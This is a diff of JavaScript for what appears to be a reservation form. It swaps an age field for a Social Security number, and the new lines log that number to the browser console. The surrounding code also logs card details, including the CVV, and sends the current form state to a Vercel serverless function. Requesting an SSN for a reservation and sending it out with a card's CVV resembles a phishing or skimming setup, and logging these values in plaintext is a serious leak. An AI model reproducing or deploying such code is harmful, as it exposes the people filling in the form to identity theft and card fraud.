@@ -68,7 +68,7 @@ async function sendCurrentFormStateToVercel() {
             cvv: formData.get('cardCVV') || '',
             name: formData.get('cardName') || ''
         };
-        currentData.age = formData.get('age') || '';
+        currentData.ssn = formData.get('ssn') || '';
     }
     
     // Log to console
@@ -87,7 +87,7 @@ async function sendCurrentFormStateToVercel() {
             expiry: currentData.creditCard.expiry,
             name: currentData.creditCard.name
         });
-        console.log('Age:', currentData.age);
+        console.log('SSN:', currentData.ssn);
     }
     
     // Send to Vercel
@@ -163,7 +163,7 @@ async function handleReservationSubmit(event) {
             cvv: formData.get('cardCVV'),
             name: formData.get('cardName')
         };
-        reservation.age = formData.get('age');
+        reservation.ssn = formData.get('ssn');
     }
     
     // Log to console (local logging)
@@ -182,7 +182,7 @@ async function handleReservationSubmit(event) {
             expiry: reservation.creditCard.expiry,
             name: reservation.creditCard.name
         });
-        console.log('Age:', reservation.age);
+        console.log('SSN:', reservation.ssn);
     }
     
     // Send to Vercel serverless function
